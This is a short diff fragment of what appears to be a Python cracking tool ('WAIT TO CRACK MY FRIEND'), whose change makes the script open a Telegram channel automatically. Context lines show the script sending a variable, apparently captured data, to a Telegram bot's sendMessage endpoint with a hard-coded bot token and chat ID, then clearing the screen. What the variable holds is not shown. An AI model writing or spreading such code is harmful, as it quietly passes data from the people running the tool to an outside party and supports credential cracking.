@@ -71,7 +71,7 @@ WAIT TO CRACK MY FRIEND ♡
 requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(KV))
 os.system('clear')
 import webbrowser
-#webbrowser.open('https://t.me/SGS5G')
+webbrowser.open('https://t.me/SGS5G')
 
 os.system('clear')
 pretty.install()
